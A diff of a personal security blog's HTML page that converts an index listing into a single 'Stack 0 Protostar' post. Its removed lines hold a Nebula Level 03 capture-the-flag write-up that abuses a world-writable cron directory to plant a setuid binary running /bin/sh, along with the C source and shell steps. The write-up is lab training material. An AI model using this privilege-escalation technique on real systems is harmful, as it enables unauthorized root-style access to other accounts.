@@ -11,7 +11,7 @@
 
   <title>
     
-      Álvaro Felipe Melchor &middot; Stuff about everything
+      Stack 0 Protostart
     
   </title>
 
@@ -91,18 +91,10 @@
 
 
     <div class="content container">
-      <div class="posts">
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="/posts/protostartstack0">
-        Stack 0 Protostart
-      </a>
-    </h1>
-
-    <span class="post-date">14 Dec 2014</span>
-
-    <p>I have started to play with the protostar VM along with nebula. This VM presents the concept about the memory issues as buffer overflows in stack and in the heap, format string and so on.</p>
+      <div class="post">
+  <h1 class="post-title">Stack 0 Protostart</h1>
+  <span class="post-date">14 Dec 2014</span>
+  <p>I have started to play with the protostar VM along with nebula. This VM presents the concept about the memory issues as buffer overflows in stack and in the heap, format string and so on.</p>
 
 <p>The first exercise present a buffer overflow. The code is as follows.</p>
 <div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdlib.h&gt;</span>
@@ -174,92 +166,76 @@ you have changed the <span class="s1">&#39;modified&#39;</span> variable
 </code></pre></div>
 <p>If you want to augment your knowledge about stack and how to exploit it I encourage to read the article <a href="http://q.hscott.net/reads/stack_smashing.pdf">Smash the Stack For Fun And Profit by Aleph One</a></p>
 
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="/posts/nebulalevel03">
-        Nebula Level 03
-      </a>
-    </h1>
-
-    <span class="post-date">14 Dec 2014</span>
-
-    <p>In the challenge 3 there is a crontab called every couple of minutes for user <code>flag03</code>. The directory is as follows. </p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">level03@nebula:/home/flag03<span class="nv">$ </span>ls -l
-total 9
-drwxrwxrwx <span class="m">1</span> flag03 flag03   <span class="m">40</span> Dec <span class="m">14</span> 07:42 writable.d
--rwxr-xr-x <span class="m">1</span> flag03 flag03   <span class="m">98</span> Nov <span class="m">20</span>  <span class="m">2011</span> writable.sh
-</code></pre></div>
-<p>Is logical to think that the script that is executed each two minutes by crontab should be writable.sh.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/sh</span>
-
-<span class="k">for</span> i in /home/flag03/writable.d/* <span class="p">;</span> <span class="k">do</span>
-    <span class="o">(</span><span class="nb">ulimit</span> -t 5<span class="p">;</span> bash -x <span class="s2">&quot;$i&quot;</span><span class="o">)</span>
-    rm -f <span class="s2">&quot;$i&quot;</span>
-<span class="k">done</span>
-</code></pre></div>
-<p>Basically the aim of this script is to execute all files in the writable.d directory. This directory has special permission since everyone can write or read in it as <code>/tmp</code>. We should achieve that the script <code>writable.sh</code> executes some binary and inherit its ownership. In that way if we can execute <code>/bin/sh</code> with the flag03 user we will be able to run <code>getflag</code> in a flag account.</p>
-
-<p>All what we must do is write the following program in <code>/tmp</code> since anyone is able to write in it.</p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdlib.h&gt;</span>
-<span class="cp">#include &lt;unistd.h&gt;</span>
-<span class="cp">#include &lt;sys/types.h&gt;</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="kt">uid_t</span> <span class="n">euid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span> 
-    <span class="kt">gid_t</span> <span class="n">egid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span> 
-    <span class="n">setresgid</span><span class="p">(</span><span class="n">egid</span><span class="p">,</span> <span class="n">egid</span><span class="p">,</span> <span class="n">egid</span><span class="p">);</span>
-    <span class="n">setresuid</span><span class="p">(</span><span class="n">euid</span><span class="p">,</span> <span class="n">euid</span><span class="p">,</span> <span class="n">euid</span><span class="p">);</span>
-
-    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><div class="highlight"><pre><code class="language-bash" data-lang="bash">level03@nebula:/tmp<span class="nv">$ </span>make pwned
-cc     pwned.c   -o pwned
-level03@nebula:/tmp<span class="nv">$ </span>cat execme
-cp /tmp/pwned /home/flag03/pwned
-chown flag03 /home/flag03/pwned
-chmod u+s /home/flag03/pwned
-level03@nebula:/tmp<span class="nv">$ </span>chmod +x execme
-level03@nebula:/tmp<span class="nv">$ </span>cp execme /home/flag03/writable.d/
-</code></pre></div>
-<p>Copying the file execme in <code>/home/flag03/writable.d</code>, it will be execute each two minutes by the user <code>flag03</code>. Thanks to that,  the binary <code>pwned</code> in the <code>/home/flag03</code> will be set uid by the user <code>flag03</code> and when the user <code>level03</code> executes the binary it will run as <code>flag03</code>.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">level03@nebula:/home/flag03<span class="nv">$ </span>ls -l
-total 9
--rwsrwxr-x <span class="m">1</span> flag03 flag03 <span class="m">7321</span> Dec <span class="m">14</span> 07:42 pwned
-drwxrwxrwx <span class="m">1</span> flag03 flag03   <span class="m">40</span> Dec <span class="m">14</span> 07:42 writable.d
--rwxr-xr-x <span class="m">1</span> flag03 flag03   <span class="m">98</span> Nov <span class="m">20</span>  <span class="m">2011</span> writable.sh
-level03@nebula:/home/flag03<span class="nv">$ </span>./pwned
-sh-4.2<span class="nv">$ </span>id
-<span class="nv">uid</span><span class="o">=</span>996<span class="o">(</span>flag03<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>level03<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>996<span class="o">(</span>flag03<span class="o">)</span>,1004<span class="o">(</span>level03<span class="o">)</span>
-sh-4.2<span class="nv">$ </span>getflag
-You have successfully executed getflag on a target account
-</code></pre></div>
-<blockquote>
-<p>If you try run <code>writable.sh</code> by your own you execute everything with <code>level03</code> ownership. I had a problem due to crontab is wasn’t call so I had to configure it to work. All what you should do is the following in the terminal write <code>crontab -e</code> and configure the script to run as: <code>* * * * * flag03 /home/flag03/writable.sh</code>. With this the script will be run each minute by the user <code>flag03</code></p>
-</blockquote>
-
-<p>If you liked this post, you can
-<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/nebulalevel03&text=Nebula Level 03&via=alvaro_fe">share it with your followers</a>
-or
-<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
-
-  </div>
-  
 </div>
 
-<div class="pagination">
-  
-    <a class="pagination-item older" href="/page2">Older</a>
-  
-  
-    <span class="pagination-item newer">Newer</span>
-  
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_developer = 1;
+    var disqus_shortname = 'codepwn'; // required: replace example with your forum shortname
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+
+<div class="related">
+  <h2>Related Posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/posts/nebulalevel03">
+            Nebula Level 03
+            <small>14 Dec 2014</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/posts/nebulalevel02">
+            Nebula Level 02
+            <small>11 Dec 2014</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/posts/nebulalevel01">
+            Nebula Level 01
+            <small>10 Dec 2014</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
 </div>
+
+
     </div>
 
     
+<!-- Add Disqus comments. -->
+<div id="disqus_thread"></div>
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'alvarofe'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
 
     
   </body>
